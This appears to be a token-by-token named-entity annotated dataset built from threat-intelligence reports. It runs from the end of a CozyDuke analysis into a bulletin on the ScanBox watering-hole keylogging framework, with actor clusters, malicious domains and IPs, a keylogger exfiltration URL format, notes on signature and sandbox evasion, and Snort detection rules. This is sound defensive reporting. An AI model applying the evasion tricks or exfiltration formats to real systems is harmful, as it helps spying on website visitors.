from	O
2013	O
,	O
but	O
we	O
believe	O
CozyDuke	O
to	O
have	O
been	O
under	O
active	O
development	O
as	O
well	O
during	O
that	O
year	O
.	O
Between	O
2012	O
and	O
2014	O
,	O
the	O
authors	O
of	O
CozyDuke	O
appear	O
to	O
have	O
performed	O
significant	O
refactoring	O
of	O
the	O
CozyDuke	O
codebase	O
,	O
even	O
though	O
functionally	O
the	O
differences	O
are	O
smaller	O
.	O
Examples	O
of	O
this	O
refactoring	O
include	O
for	O
instance	O
the	O
switch	O
from	O
using	O
the	O
Pugi	O
-	O
XML	O
library	O
to	O
using	O
Microsoft	O
's	O
MSXML	O
3.0	O
for	O
XML	O
-	O
related	O
functionality	O
.	O
The	O
latest	O
CozyDuke	O
main	O
component	O
we	O
observed	O
was	O
compiled	O
on	O
the	O
26th	O
of	O
February	O
,	O
2015	O
.	O
The	O
core	O
functionality	O
of	O
the	O
latest	O
sample	O
is	O
very	O
similar	O
to	O
the	O
previous	O
sample	O
from	O
July	O
of	O
2014	O
,	O
but	O
the	O
authors	O
of	O
CozyDuke	O
have	O
implemented	O
a	O
lot	O
of	O
additional	O
functionality	O
,	O
as	O
the	O
increase	O
in	O
size	O
from	O
279	O
KB	O
to	O
820	O
KB	O
would	O
also	O
suggest	O
.	O
Based	O
on	O
logging	O
strings	O
,	O
variable	O
naming	O
and	O
PDB	O
strings	O
found	O
in	O
CozyDuke	O
samples	O
,	O
we	O
observed	O
the	O
following	O
.	O
PDB	O
strings	O
found	O
in	O
early	O
CozyDuke	O
samples	O
are	O
listed	O
in	O
Table	O
4	O
(	O
below	O
)	O
.	O
Please	O
e	O
-	O
mail	O
us	O
at	O
threatintelligence@uk.pwc.com	O
for	O
a	O
version	O
of	O
this	O
report	O
with	O
additional	O
indicators	O
that	O
you	O
are	O
welcome	O
to	O
distribute	O
so	O
long	O
as	O
it	O
is	O
not	O
on	O
public	O
channels	O
(	O
TLP	O
-	O
GREEN	O
)	O
.	O
We	O
have	O
observed	O
actors	O
amending	O
the	O
ScanBox	O
framework	O
to	O
evade	O
existing	O
public	O
signatures	O
,	O
detailed	O
below	O
.	O
Security	O
researchers	O
have	O
often	O
made	O
the	O
mistake	O
of	O
assuming	O
that	O
when	O
a	O
specific	O
tool	O
was	O
observed	O
being	O
used	O
in	O
espionage	O
attacks	O
,	O
it	O
was	O
representative	O
of	O
activity	O
of	O
a	O
single	O
actor	O
.	O
More	O
frequently	O
,	O
however	O
,	O
many	O
are	O
now	O
identifying	O
that	O
distinct	O
groups	O
of	O
attackers	O
are	O
sharing	O
their	O
toolsets	O
,	O
just	O
as	O
in	O
the	O
cybercrime	O
world	O
.	O
One	O
such	O
toolset	O
,	O
the	O
ScanBox	O
framework	O
,	O
is	O
now	O
shared	O
between	O
a	O
number	O
of	O
groups	O
who	O
conduct	O
espionage	O
attacks	O
.	O
Evidence	O
suggests	O
that	O
these	O
groups	O
include	O
those	O
behind	O
the	O
recent	O
Forbes	O
and	O
Anthem	O
attacks	O
.	O
This	O
short	O
paper	O
outlines	O
our	O
current	O
perspectives	O
on	O
the	O
previously	O
discussed	O
espionage	O
groups	O
currently	O
using	O
the	O
framework	O
and	O
a	O
hint	O
that	O
a	O
5th	O
player	O
is	O
getting	O
in	O
on	O
the	O
game	O
.	O
ScanBox	B-Entity
performs	O
keylogging	B-Action
of	B-Entity
users	I-Entity
when	B-Modifier
they	B-Entity
visit	B-Entity
a	I-Entity
compromised	I-Entity
website	I-Entity
,	O
without	O
requiring	O
malware	O
to	O
be	O
deployed	O
,	O
and	O
can	O
collect	O
a	O
great	O
deal	O
of	O
information	O
which	O
can	O
be	O
used	O
to	O
tailor	O
future	O
attacks	O
In	O
October	O
we	O
published	O
some	O
details	O
of	O
the	O
ScanBox	O
tool	O
set	O
.	O
Since	O
then	O
we	O
have	O
encountered	O
24	O
additional	O
sites	O
compromised	O
with	O
the	O
framework	O
.	O
Over	O
this	O
time	O
we	O
have	O
observed	O
changes	O
to	O
the	O
code	O
and	O
novel	O
techniques	O
for	O
executing	O
.	O
We	O
have	O
also	O
received	O
a	O
number	O
of	O
tip	O
offs	O
from	O
other	O
researchers	O
,	O
as	O
well	O
as	O
queries	O
from	O
victims	O
who	O
were	O
directly	O
targeted	O
by	O
those	O
using	O
the	O
framework	O
.	O
We	O
would	O
like	O
to	O
extend	O
our	O
thanks	O
to	O
these	O
individuals	O
for	O
their	O
contributions	O
towards	O
this	O
research	O
.	O
The	O
following	O
diagram	O
shows	O
the	O
links	O
in	O
tools	O
and	O
targets	O
between	O
the	O
groups	O
discussed	O
in	O
our	O
previous	O
blog	O
,	O
but	O
newer	O
information	O
has	O
since	O
come	O
to	O
light	O
which	O
allows	O
us	O
to	O
more	O
accurately	O
associate	O
these	O
groups	O
with	O
known	O
threat	O
actors	O
.	O
Between	O
these	O
clusters	O
,	O
we	O
've	O
seen	O
strategic	O
web	O
compromises	O
designed	O
to	O
target	O
users	O
in	O
the	O
following	O
countries	O
.	O
Tactical	O
Intelligence	O
Bulletin	O
–	O
TLP	O
:	O
WHITE	O
Since	O
our	O
last	O
post	O
there	O
have	O
been	O
several	O
alterations	O
to	O
the	O
ScanBox	O
code	O
base	O
,	O
including	O
new	O
modules	O
,	O
changes	O
to	O
avoid	O
signature	O
based	O
detection	O
,	O
as	O
well	O
as	O
extra	O
techniques	O
to	O
try	O
to	O
identify	O
whether	O
those	O
being	O
scanned	O
are	O
real	O
machines	O
or	O
researchers	O
.	O
In	O
some	O
cases	O
we	O
have	O
been	O
able	O
to	O
watch	O
developers	O
update	O
and	O
test	O
variants	O
of	O
the	O
framework	O
,	O
and	O
even	O
come	O
across	O
server	O
-	O
side	O
code	O
being	O
tested	O
by	O
budding	O
hackers	O
.	O
Our	O
findings	O
are	O
detailed	O
below	O
.	O
Following	O
on	O
from	O
our	O
previous	O
post	O
on	O
ScanBox1	O
,	O
we	O
have	O
watched	O
the	O
clusters	O
of	O
activity	O
outlined	O
with	O
close	O
interest	O
,	O
as	O
well	O
as	O
keeping	O
an	O
eye	O
on	O
new	O
adopters	O
of	O
the	O
ScanBox	O
framework	O
.	O
For	O
those	O
who	O
did	O
n't	O
read	O
our	O
last	O
entry	O
on	O
the	O
framework	O
,	O
nor	O
the	O
excellent	O
work	O
by	O
Jaime	O
Blasco2	O
which	O
preceded	O
it	O
,	O
ScanBox	O
is	O
a	O
framework	O
written	O
in	O
JavaScript	O
and	O
PHP	O
which	O
allows	O
an	B-Entity
attacker	I-Entity
to	O
perform	O
reconnaissance	B-Action
and	B-Entity
key	I-Entity
logging	I-Entity
of	I-Entity
visitors	I-Entity
to	I-Entity
compromised	I-Entity
websites	I-Entity
without	O
requiring	O
any	O
malware	O
to	O
be	O
downloaded	O
or	O
installed	O
.	O
The	O
framework	O
has	O
remained	O
in	O
use	O
since	O
initial	O
analyses	O
were	O
published	O
,	O
and	O
further	O
analysis	O
of	O
the	O
code	O
,	O
public	O
reporting	O
,	O
as	O
well	O
as	O
the	O
infrastructure	O
used	O
to	O
host	O
ScanBox	O
infections	O
has	O
given	O
us	O
a	O
better	O
picture	O
of	O
some	O
of	O
the	O
clusters	O
of	O
activity	O
we	O
identified	O
in	O
our	O
earlier	O
blog	O
.	O
In	O
addition	O
to	O
the	O
four	O
websites	O
we	O
previously	O
identified	O
hosting	O
the	O
malicious	O
code	O
,	O
we	O
've	O
now	O
identified	O
a	O
further	O
24	O
websites	O
hosting	O
the	O
framework	O
.	O
Anonymised	O
data	O
relating	O
the	O
countries	O
and	O
sectors	O
affected	O
are	O
given	O
in	O
appendix	O
A.	O
Broadly	O
,	O
the	O
ScanBox	O
framework	O
codebase	O
has	O
remained	O
the	O
same	O
,	O
however	O
there	O
are	O
slight	O
nuances	O
in	O
some	O
aspects	O
of	O
the	O
code	O
,	O
or	O
in	O
the	O
software	O
attackers	O
choose	O
to	O
search	O
for	O
.	O
In	O
cases	O
where	O
the	O
attackers	O
have	O
included	O
software	O
checks	O
within	O
their	O
ScanBox	O
code	O
,	O
it	O
tends	O
to	O
be	O
for	O
the	O
same	O
original	O
list	O
of	O
filenames	O
(	O
Appendix	O
C	O
)	O
.	O
In	O
some	O
cases	O
the	O
attackers	O
customise	O
the	O
list	O
,	O
presumably	O
based	O
on	O
the	O
things	O
they	O
're	O
expecting	O
to	O
find	O
.	O
For	O
example	O
,	O
adding	B-Action
or	O
removing	O
additional	O
security	O
products	O
based	O
on	O
the	O
predominant	O
software	O
providers	O
in	O
their	O
target	O
region	O
.	O
It	O
's	O
also	O
worth	O
noting	O
that	O
the	O
standard	O
list	O
includes	O
quite	O
a	O
lot	O
of	O
software	O
which	O
is	O
less	O
relevant	O
to	O
security	O
(	O
examples	O
include	O
WinRAR	O
,	O
iTunes	O
and	O
WinZip	O
)	O
.	O
Some	O
of	O
these	O
may	O
be	O
included	O
in	O
order	O
to	O
help	O
the	O
attackers	O
to	O
try	O
and	O
identify	O
real	O
victims	O
vs	O
researchers	O
/	O
sandboxes	O
/	O
honeypots	O
.	O
An	O
example	O
list	O
is	O
shown	O
in	O
the	O
following	O
screenshot	O
.	O
In	O
one	O
cluster	O
of	O
ScanBox	O
activity	O
,	O
instead	O
of	O
checking	O
for	O
specific	O
files	O
as	O
per	O
the	O
method	O
above	O
,	O
the	O
attackers	O
have	O
implemented	O
a	O
different	O
method	O
of	O
tracking	O
files	B-Action
and	B-Entity
drives	I-Entity
present	I-Entity
on	I-Entity
the	I-Entity
victim	I-Entity
machine	I-Entity
.	O
The	O
first	O
piece	O
of	O
new	O
functionality	O
is	O
that	O
the	O
attackers	O
build	O
a	O
possible	O
list	O
of	O
drive	O
names	O
(	O
A	O
-	O
Z	O
)	O
and	O
scan	O
for	O
the	O
existence	O
of	O
each	O
drive	O
.	O
They	O
do	O
not	O
check	O
files	O
directly	O
either	O
,	O
instead	O
,	O
checking	O
for	O
the	O
presence	O
of	O
a	O
list	O
of	O
folder	O
names	O
.	O
In	O
this	O
case	O
,	O
rather	O
than	O
determining	O
what	O
security	O
software	O
is	O
present	O
,	O
this	O
check	O
would	O
mainly	O
be	O
useful	O
in	O
assisting	O
the	O
attacker	O
with	O
identifying	O
the	O
victim	O
's	O
operating	O
system	O
.	O
This	O
could	O
then	O
be	O
used	O
to	O
tailor	O
future	O
attacks	O
(	O
i.e.	O
should	O
I	O
deploy	O
malware	O
which	O
can	O
bypass	O
UAC	O
?	O
Should	O
I	O
send	O
malicious	O
documents	O
targeting	O
CVE-2012	O
-	O
0158	O
or	O
not	O
?	O
)	O
.	O
Also	O
,	O
bizarrely	O
the	O
attackers	O
check	O
the	O
path	O
'	O
Program	O
Files	O
(	O
x80236	O
)	O
'	O
–	O
if	O
anyone	O
knows	O
what	O
this	O
corresponds	O
to	O
,	O
please	O
get	O
in	O
touch	O
and	O
let	O
us	O
know	O
.	O
As	O
we	O
stated	O
earlier	O
,	O
some	O
of	O
the	O
features	O
of	O
the	O
original	O
ScanBox	O
code	O
were	O
probably	O
designed	O
to	O
help	O
those	O
analysing	O
results	O
distinguish	O
between	O
honeypots	O
/	O
analysis	O
environments	O
and	O
real	O
-	O
world	O
victims	O
.	O
The	O
newly	O
added	O
variables	O
include	O
.	O
Updates	O
to	O
evade	O
signatures	O
Possibly	O
in	O
response	O
to	O
our	O
previous	O
report	O
,	O
we	O
've	O
seen	O
some	O
of	O
the	O
groups	O
using	O
ScanBox	O
alter	O
the	O
content	O
of	O
the	O
modules	O
to	O
evade	O
detection	O
.	O
Attackers	O
do	O
read	O
reports	O
,	O
both	O
to	O
help	O
them	O
attack3	O
and	O
also	O
to	O
evade	O
detection	O
.	O
One	O
change	O
has	O
been	O
the	O
URI	O
formats	O
used	O
to	O
deliver	O
stolen	O
key	O
log	O
data	O
from	O
obvious	O
URLs	O
such	O
as	O
.	O
/k.php?data=[KeyloggerData	O
]	O
To	O
more	O
subtle	O
URLs	O
such	O
as	O
.	O
/[KeyloggerData].jpg	O
We	O
also	O
note	O
that	O
following	O
our	O
release	O
of	O
a	O
signature	O
to	O
detect	O
the	O
phrase	O
"	O
No	O
Java	O
or	O
Disable	O
"	O
,	O
which	O
was	O
present	O
in	O
a	O
number	O
of	O
related	O
frameworks	O
,	O
some	O
of	O
the	O
attackers	O
have	O
now	O
changed	O
this	O
to	O
"	O
No	O
or	O
Disable	O
"	O
.	O
In	O
our	O
previous	O
entry	O
on	O
ScanBox	O
we	O
described	O
four	O
clusters	O
of	O
activity	O
–	O
this	O
section	O
includes	O
updates	O
on	O
those	O
clusters	O
.	O
Previously	O
,	O
we	O
were	O
only	O
able	O
to	O
cluster	O
activity	O
based	O
on	O
the	O
infrastructure	O
used	O
and	O
the	O
associated	O
malware	O
,	O
we	O
now	O
have	O
a	O
sufficient	O
number	O
of	O
samples	O
to	O
cluster	O
based	O
on	O
differences	O
in	O
implementation	O
between	O
the	O
code	O
used	O
for	O
ScanBox	O
in	O
each	O
case	O
.	O
The	O
recently	O
published	O
FBI	O
flash	O
alert	O
#	O
A-000049-MW4	O
,	O
cited	O
domain	O
names	O
previously	O
referenced	O
in	O
our	O
blog	O
as	O
being	O
related	O
to	O
an	O
actor	O
known	O
as	O
Deep	O
Panda	O
,	O
which	O
we	O
'll	O
get	O
to	O
in	O
a	O
minute	O
.	O
The	O
link	O
appears	O
to	O
have	O
been	O
made	O
from	O
the	O
use	O
of	O
the	O
DerUsbi	O
malware	O
family	O
though	O
,	O
which	O
we	O
know	O
to	O
be	O
used	O
by	O
several	O
espionage	O
actors	O
.	O
What	O
is	O
interesting	O
is	O
the	O
potential	O
overlap	O
between	O
the	O
target	O
selection	O
of	O
this	O
cluster	O
and	O
the	O
targets	O
of	O
those	O
behind	O
the	O
recently	O
reported	O
Forbes	O
compromise5,6	O
.	O
Checking	O
the	O
Google	O
SafeBrowsing	O
results	O
for	O
*	O
.googlecaches.com	O
,	O
shows	O
that	O
the	O
domain	O
was	O
used	O
for	O
distribution	O
of	O
malicious	O
code	O
for	O
a	O
significant	O
period	O
after	O
our	O
previous	O
blog	O
entry	O
.	O
This	O
includes	O
distribution	O
via	O
gokbayrak.com	O
.	O
Looking	O
at	O
whether	O
any	O
other	O
domains	O
or	O
IP	O
addresses	O
were	O
observed	O
delivering	O
malicious	O
software	O
via	O
gokbayrak.com	O
shows	O
that	O
it	O
was	O
also	O
observed	O
delivering	O
malware	O
via	O
88.80.190[.]133	O
.	O
This	O
is	O
the	O
same	O
IP	O
address	O
that	O
was	O
cited	O
in	O
iSight	O
's	O
reporting	O
of	O
the	O
Forbes	O
breach	O
.	O
In	O
fact	O
,	O
the	O
IP	O
address	O
88.80.190.133	O
was	O
involved	O
in	O
the	O
compromise	O
of	O
the	O
same	O
3	O
websites	O
as	O
SafeBrowsing	O
shows	O
were	O
affected	O
by	O
googlecaches.com	O
.	O
The	O
same	O
three	O
sites	O
targeted	O
with	O
the	O
0-day	O
used	O
in	O
the	O
Forbes	O
attack	O
were	O
also	O
observed	O
distributing	O
malware	O
via	O
googlecaches[.]com	O
-	O
we	O
therefore	O
believe	O
it	O
's	O
likely	O
that	O
the	O
group	O
we	O
previously	O
described	O
as	O
'	O
Cluster	O
1	O
'	O
was	O
behind	O
the	O
Forbes	O
compromise	O
.	O
We	O
can	O
use	O
similar	O
techniques	O
to	O
explore	O
other	O
actors	O
who	O
have	O
the	O
same	O
tasking	O
as	O
Cluster	O
1	O
.	O
In	O
the	O
screenshot	O
of	O
websites	O
delivering	O
malware	O
via	O
gokbayrak.com	O
,	O
we	O
saw	O
that	O
the	O
domain	O
name	O
macanna.com[.]tw	O
was	O
also	O
used	O
to	O
distribute	O
malware	O
from	O
this	O
page	O
.	O
Whilst	O
macanna.com[.]tw	O
appears	O
to	O
be	O
a	O
legitimate	O
site	O
,	O
it	O
has	O
also	O
been	O
observed	O
as	O
being	O
a	O
command	B-Entity
and	I-Entity
control	I-Entity
destination	I-Entity
for	I-Entity
malware	I-Entity
.	O
The	O
malware	O
sample	O
in	O
question	O
has	O
a	O
hash	O
of	O
3b8d7732de3b3c8823d241e7cd3185c4	O
.	O
The	O
same	O
sample	O
also	O
communicates	O
with	O
happynewyear.dns04[.]com	O
,	O
which	O
in	O
turn	O
resolves	O
to	O
the	O
IP	O
address	O
115.23.172[.]151	O
,	O
which	O
hosts	O
a	O
large	O
number	O
of	O
other	O
malicious	O
host	O
names	O
.	O
These	O
following	O
hostnames	O
are	O
activity	O
associated	O
with	O
the	O
actor	O
best	O
known	O
as	O
TH3Bug7	O
-	O
named	O
after	O
their	O
choice	O
of	O
Poison	O
Ivy	O
password	O
.	O
Their	O
malware	O
samples	O
are	O
present	O
in	O
the	O
same	O
cluster	O
.	O
This	O
cluster	O
relates	O
to	O
the	O
threat	O
actor	O
referred	O
to	O
as	O
Deep	O
Panda	O
by	O
CrowdStrike	O
,	O
as	O
was	O
confirmed	O
in	O
a	O
recent	O
blog	O
post8	O
.	O
In	O
turn	O
,	O
this	O
is	O
widely	O
believed	O
to	O
relate	O
to	O
the	O
incident	O
at	O
Anthem	O
,	O
as	O
described	O
in	O
a	O
Krebs	O
post9	O
.	O
The	O
graph	O
below	O
shows	O
the	O
links	O
between	O
the	O
we11point.com	O
domain	O
name	O
,	O
and	O
news.foundationssl[.]com	O
as	O
seen	O
on	O
the	O
CrowdStrike	O
blogpost	O
.	O
The	O
Krebs	O
article	O
also	O
points	O
toward	O
other	O
possible	O
(	O
although	O
not	O
explicit	O
)	O
links	O
between	O
the	O
domain	O
allegedly	O
used	O
in	O
the	O
Anthem	O
hack	O
(	O
we11point.com	O
)	O
to	O
Cluster	O
2	O
through	O
shared	O
WHOIS	O
details	O
,	O
as	O
we11point.com	O
was	O
registered	O
by	O
domain	O
re	O
-	O
seller	O
'	O
li2384826402@yahoo.com	O
'	O
On	O
its	O
own	O
,	O
this	O
would	O
not	O
be	O
sufficient	O
to	O
associate	O
the	O
two	O
clusters	O
,	O
but	O
it	O
is	O
useful	O
to	O
note	O
as	O
a	O
'	O
softer	O
'	O
overlap	O
.	O
Cluster	O
3	O
remains	O
a	O
mystery	O
,	O
unfortunately	O
the	O
code	O
used	O
in	O
this	O
instance	O
is	O
the	O
most	O
slim	O
line	O
version	O
,	O
and	O
has	O
since	O
not	O
been	O
widely	O
re	O
-	O
used	O
–	O
it	O
is	O
unclear	O
who	O
was	O
behind	O
the	O
compromise	O
using	O
this	O
domain	O
name	O
.	O
We	O
'd	O
previously	O
missed	O
the	O
link	O
between	O
Cluster	O
4	O
–	O
and	O
malware	O
widely	O
known	O
as	O
'	O
EvilGrab	O
'	O
or	O
'	O
Vidgrab	O
'	O
.	O
From	O
our	O
view	O
point	O
,	O
this	O
malware	O
is	O
exclusively	O
used	O
by	O
one	O
group	O
,	O
known	O
by	O
CrowdStrike	O
as	O
Stone	O
Panda10	O
.	O
In	O
addition	O
to	O
the	O
four	O
clusters	O
outlined	O
above	O
,	O
within	O
the	O
24	O
additional	O
compromises	O
identified	O
,	O
we	O
believe	O
there	O
are	O
at	O
least	O
3	O
other	O
distinct	O
groups	O
using	O
the	O
framework	O
.	O
In	O
their	O
2013	O
paper	O
'	O
From	O
Quartermaster	O
to	O
Sunshop'11	O
,	O
FireEye	O
described	O
the	O
concept	O
of	O
a	O
Digital	O
Quartermaster	O
,	O
a	O
kind	O
of	O
malware	O
supply	O
chain	O
for	O
intrusions	O
,	O
where	O
a	O
skilled	O
team	O
would	O
develop	O
toolsets	O
for	O
a	O
range	O
of	O
attackers	O
who	O
deploy	O
them	O
.	O
The	O
shared	O
use	O
of	O
ScanBox	O
may	O
match	O
up	O
quite	O
well	O
to	O
this	O
hypothesis	O
,	O
and	O
indeed	O
even	O
to	O
some	O
extent	O
the	O
naming	O
schema	O
overlaps	O
,	O
as	O
iSight	O
refer	O
to	O
the	O
actor	O
behind	O
the	O
Forbes	O
breach	O
as	O
Codoso	O
,	O
but	O
suggest	O
they	O
are	O
publically	O
known	O
as	O
'	O
Sunshop	O
'	O
.	O
In	O
all	O
likelihood	O
this	O
relates	O
to	O
a	O
series	O
of	O
blogs	O
byFireEye	O
which	O
refer	O
to	O
a	O
series	O
of	O
web	O
compromises	O
in	O
2013	O
as	O
being	O
the	O
SunShop12	O
campaign	O
.	O
Although	O
we	O
did	O
not	O
notice	O
the	O
correlation	O
immediately	O
,	O
there	O
is	O
good	O
overlap	O
between	O
the	O
groups	O
we	O
've	O
described	O
above	O
,	O
and	O
the	O
clusters	O
of	O
activity	O
described	O
as	O
sharing	O
a	O
Flash	O
0-day	O
in	O
early	O
2014	O
by	O
Symantec13	O
.	O
Although	O
other	O
groups	O
have	O
since	O
begun	O
using	O
the	O
framework	O
,	O
the	O
first	O
groups	O
to	O
use	O
the	O
framework	O
(	O
clusters	O
1	O
-	O
4	O
)	O
correspond	O
quite	O
nicely	O
to	O
the	O
existing	O
Symantec	O
blog	O
.	O
For	O
reference	O
,	O
we	O
've	O
overlaid	O
our	O
ScanBox	O
clusters	O
against	O
the	O
likely	O
clusters	O
Symantec	O
created	O
behind	O
the	O
scenes	O
for	O
their	O
blog	O
,	O
as	O
well	O
as	O
other	O
popular	O
names	O
.	O
Please	O
note	O
that	O
each	O
vendor	O
has	O
their	O
own	O
way	O
of	O
grouping	O
activity	O
together	O
,	O
so	O
these	O
mappings	O
are	O
given	O
on	O
a	O
best	O
efforts	O
basis	O
.	O
In	O
all	O
examples	O
of	O
ScanBox	O
deployments	O
discussed	O
so	O
far	O
,	O
we	O
believe	O
that	O
the	O
scripts	O
were	O
deployed	O
to	O
anyone	O
who	O
visited	O
websites	O
of	O
interest	O
to	O
a	O
given	O
sector	O
which	O
the	O
attacker	O
was	O
able	O
to	O
compromise–	O
and	O
that	O
the	O
attackers	O
waited	O
for	O
victims	O
to	O
visit	O
the	O
compromised	O
site	O
.	O
However	O
one	O
group	O
of	O
attackers	O
using	O
the	O
ScanBox	O
framework	O
are	O
now	O
actively	O
sending	O
e	O
-	O
mails	O
to	O
potential	O
victims	O
,	O
where	O
the	B-Entity
e	I-Entity
-	I-Entity
mails	I-Entity
contain	O
links	B-Action
to	B-Entity
websites	I-Entity
hosting	I-Entity
ScanBox	I-Entity
.	O
We	O
believe	O
these	O
attackers	O
are	O
not	O
covered	O
by	O
the	O
existing	O
clusters	O
1	O
through	O
4	O
,	O
as	O
the	O
code	O
differs	O
from	O
that	O
used	O
elsewhere	O
.	O
This	O
method	O
of	O
sending	O
links	O
rather	O
than	O
waiting	O
for	O
visiting	O
a	O
specific	O
compromised	O
website	O
has	O
two	O
main	O
advantages	O
.	O
This	O
group	O
differs	O
from	O
the	O
others	O
based	O
on	O
the	O
following	O
characteristics	O
.	O
So	O
far	O
we	O
have	O
identified	O
four	O
low	O
key	O
websites	O
,	O
all	O
belonging	O
to	O
small	O
companies	O
based	O
in	O
the	O
United	O
States	O
or	O
Canada	O
which	O
are	O
being	O
abused	O
in	O
this	O
fashion	O
.	O
At	O
one	O
point	O
during	O
our	O
investigation	O
into	O
infrastructure	O
hosting	O
ScanBox	O
code	O
,	O
we	O
identified	O
a	O
server	O
which	O
appeared	O
to	O
be	O
used	O
for	O
development	O
and	O
testing	O
purposes	O
.	O
On	O
this	O
occasion	O
,	O
the	O
server	O
side	O
code	O
was	O
publicly	O
accessible	O
,	O
allowing	O
us	O
to	O
gain	O
insights	O
into	O
the	O
development	O
and	O
testing	O
phase	O
of	O
an	O
attack	O
using	O
ScanBox	O
.	O
This	O
also	O
included	O
the	O
ScanBox	O
framework	O
's	O
own	O
detailed	O
reconnaissance	O
against	O
the	O
developer	O
themselves	O
.	O
We	O
noted	O
the	O
developer	O
repeatedly	O
uploading	O
the	O
modified	O
versions	O
to	O
VirusTotal	O
,	O
presumably	O
in	O
an	O
attempt	O
to	O
improve	O
evasion	O
of	O
anti	O
-	O
virus	O
.	O
We	O
do	O
not	O
believe	O
this	O
developer	O
is	O
part	O
of	O
the	O
core	O
group	O
that	O
has	O
access	O
to	O
the	O
original	O
implementation	O
,	O
but	O
is	O
instead	O
another	O
actor	O
,	O
who	O
is	O
likely	O
rebuilding	O
ScanBox	O
from	O
samples	O
they	O
find	O
online	O
.	O
The	O
screenshot	O
on	O
the	O
left	O
is	O
from	O
a	O
version	O
currently	O
in	O
development	O
by	O
a	O
possible	O
attacker	O
,	O
the	O
corresponding	O
screenshot	O
on	O
the	O
right	O
is	O
from	O
a	O
public	O
article15	O
.	O
The	O
publication	O
of	O
threat	O
information	O
allows	O
us	O
to	O
draw	O
links	O
between	O
different	O
campaigns	O
,	O
tools	O
and	O
malware	O
but	O
we	O
need	O
to	O
be	O
careful	O
about	O
which	O
links	O
we	O
consider	O
to	O
be	O
significant	O
and	O
ensure	O
we	O
're	O
confident	O
in	O
how	O
information	O
that	O
's	O
publically	O
available	O
was	O
derived	O
.	O
The	O
summary	O
above	O
is	O
just	O
our	O
view	O
of	O
the	O
overlaps	O
in	O
web	O
based	O
tools	O
/	O
exploits	O
and	O
targets	O
between	O
different	O
threat	O
actors	O
,	O
but	O
those	O
with	O
different	O
datasets	O
may	O
be	O
able	O
to	O
draw	O
different	O
conclusions	O
.	O
Last	O
time	O
,	O
we	O
identified	O
three	O
possible	O
hypotheses	O
to	O
explain	O
the	O
overlap	O
between	O
the	O
ScanBox	O
users	O
,	O
in	O
this	O
blog	O
,	O
based	O
on	O
the	O
data	O
we	O
have	O
available	O
,	O
we	O
can	O
settle	O
on	O
just	O
one	O
of	O
these	O
conclusions	O
.	O
"	O
2	O
.	O
Selections	O
of	O
actors	O
share	O
some	O
resources	O
,	O
as	O
per	O
previous	O
observations	O
with	O
similar	O
kits	O
by	O
some	O
security	O
vendors	O
.	O
"	O
Specifically	O
,	O
our	O
key	O
conclusions	O
are	O
.	O
What	O
is	O
not	O
clear	O
is	O
why	O
specific	O
resources	O
(	O
web	O
-	O
based	O
exploits	O
)	O
appear	O
to	O
be	O
shared	O
,	O
and	O
why	O
others	O
(	O
primarily	O
malware	O
families	O
)	O
are	O
sometimes	O
kept	O
within	O
a	O
specific	O
cluster	O
.	O
Snort	O
Signatures	O
–	O
TLP	O
WHITE	O
alert	O
tcp	O
$	O
EXTERNAL_NET	O
any	O
-	O
>	O
$	O
HOME_NET	O
any	O
(	O
msg:"--[PwC	O
CTD	O
]	O
--	O
MultiGroup	O
-	O
ScanBox	O
and	O
Targetted	O
Watering	O
Holes	O
Content	O
(	O
plugin_pdf_ie	O
(	O
)	O
)	O
"	O
;	O
flow	O
:	O
established	O
,	O
from_server	O
;	O
file_data	O
;	O
content:"plugin_pdf_ie	O
(	O
)	O
"	O
;	O
classtype	O
:	O
trojan-	O
activity	O
;	O
reference	O
:	O
url	O
,	O
pwc.blogs.com	O
/	O
cyber_security_updates/2014/10/scanbox-	O
framework-whos-affected-and-whos-using-it-1.html	O
;	O
metadata	O
:	O
tlp	O
WHITE	O
,	O
author	O
CDD	O
;	O
sid	O
:	O
xxxxxx	O
;	O
rev:2015021901	O
;	O
)	O
alert	O
tcp	O
$	O
EXTERNAL_NET	O
any	O
-	O
>	O
$	O
HOME_NET	O
any	O
(	O
msg:"--[PwC	O
CTD	O
]	O
--	O
MultiGroup	O
-	O
ScanBox	O
Watering	O
Hole	O
Content	O
(	O
.item(0).appendChild(iframe_tag	O
)	O
)	O
"	O
;	O
flow	O
:	O
established	O
,	O
from_server	O
;	O
file_data	O
;	O
content:".item(0).appendChild(iframe_tag	O
)	O
"	O
;	O
classtype	O
:	O
trojan	O
-	O
activity	O
;	O
reference	O
:	O
url	O
,	O
pwc.blogs.com	O
/	O
cyber_security_updates/2014/10/scanbox	O
-	O
framework	O
-	O
whos-	O
affected-and-whos-using-it-1.html	O
;	O
metadata	O
:	O
tlp	O
WHITE	O
,	O
author	O
CDD	O
;	O
sid	O
:	O
xxxxxx	O
;	O
rev:2015021901	O
;	O
)	O
alert	O
tcp	O
$	O
EXTERNAL_NET	O
any	O
-	O
>	O
$	O
HOME_NET	O
any	O
(	O
msg:"--[PwC	O
CTD	O
]	O
--	O
MultiGroup	O
-	O
ScanBox	O
and	O
Targetted	O
Watering	O
Holes	O
Content	O
(	O
var	O
version\;var	O
ax\;var	O
e\;try{axo	O
=	O
new	O
ActiveXObject	O
)	O
"	O
;	O
flow	O
:	O
established	O
,	O
from_server	O
;	O
file_data	O
;	O
content:"var	O
version\;var	O
ax\;var	O
e\;try{axo	O
=	O
new	O
ActiveXObject	O
"	O
;	O
classtype	O
:	O
trojan	O
-	O
activity	O
;	O
reference	O
:	O
url	O
,	O
pwc.blogs.com	O
/	O
cyber_security_updates/2014/10/scanbox	O
-	O
framework	O
-	O
whos-	O
affected-and-whos-using-it-1.html	O
;	O
metadata	O
:	O
tlp	O
WHITE	O
,	O
author	O
CDD	O
;	O
sid	O
:	O
xxxxxx	O
;	O
rev:2015021901	O
;	O
)	O
alert	O
tcp	O
$	O
EXTERNAL_NET	O
any	O
-	O
>	O
$	O
HOME_NET	O
any	O
(	O
msg:"--[PwC	O
CTD	O
]	O
--	O
MultiGroup	O
-	O
ScanBox	O
Watering	O
Hole	O
Content	O
(	O
document.getElementsByTagName('head').item(0).appendChild(form_tag)\	O
;	O
)	O
"	O
;	O
flow	O
:	O
established	O
,	O
from_server	O
;	O
file_data	O
;	O
content:"document.getElementsByTagName('head').item(0).appendChild(form_tag)\	O
;	O
"	O
;	O
classtype	O
:	O
trojan	O
-	O
activity	O
;	O
reference	O
:	O
url	O
,	O
pwc.blogs.com	O
/	O
cyber_security_updates/2014/10/scanbox	O
-	O
framework	O
-	O
whos-	O
affected-and-whos-using-it-1.html	O
;	O
metadata	O
:	O
tlp	O
WHITE	O
,	O
author	O
CDD	O
;	O
sid	O
:	O
xxxxxx	O
;	O
rev:2015021901	O
;	O
)	O
alert	O
